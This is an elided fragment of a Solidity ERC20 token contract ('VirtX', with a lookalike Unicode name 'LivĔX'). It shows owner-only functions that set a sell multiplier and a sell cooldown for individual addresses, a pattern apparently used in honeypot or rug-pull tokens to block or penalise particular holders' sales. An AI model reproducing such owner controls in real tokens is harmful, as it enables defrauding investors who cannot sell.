...
contract VirtX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"LivĔX";
    string private constant _symbol = "LIVEx";
    ...
    function setAddyMultiplier(address addy, uint num) external onlyOwner {
        sellnumber[addy] = num;
    }

    function setAddyCooldown(address addy, uint numEpoch) external onlyOwner {
        sellcooldown[addy] = numEpoch;
    }
